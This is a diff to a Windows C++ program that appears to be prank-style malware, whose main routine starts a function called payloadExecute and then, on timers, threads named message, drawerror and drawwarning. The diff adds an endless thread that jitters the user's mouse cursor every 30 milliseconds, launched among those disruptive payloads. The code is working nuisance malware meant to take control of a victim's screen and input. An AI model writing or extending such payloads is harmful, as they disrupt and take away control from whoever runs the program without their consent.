@@ -429,6 +429,27 @@ void payloadExecute()
     }
 }
 
+void RandCursor()
+{
+    POINT p;
+    GetCursorPos(&p);
+    int sxs,sys,sxl,syl;
+    sxs = p.x - 3;
+    sys = p.y - 3;
+    sxl = p.x + 3;
+    syl = p.y + 3;
+    SetCursorPos(random(sxs, sxl), random(sys, syl));
+}
+
+DWORD WINAPI infCursor(LPVOID lpstart)
+{
+    while (1)
+    {
+        RandCursor();
+        Sleep(30);
+    }
+}
+
 int __stdcall WinMain(HINSTANCE(a), HINSTANCE(b), LPSTR(c), int(d))
 {
     std::thread th(payloadExecute);
@@ -439,6 +460,7 @@ int __stdcall WinMain(HINSTANCE(a), HINSTANCE(b), LPSTR(c), int(d))
     Sleep(30000);
     CreateThread(0, 0, message, 0, 0, 0);
     Sleep(30000);
+    CreateThread(0, 0, infCursor, 0, 0, 0);
     CreateThread(0, 0, drawerror, 0, 0, 0);
     CreateThread(0, 0, drawwarning, 0, 0, 0);
     Sleep(40000);
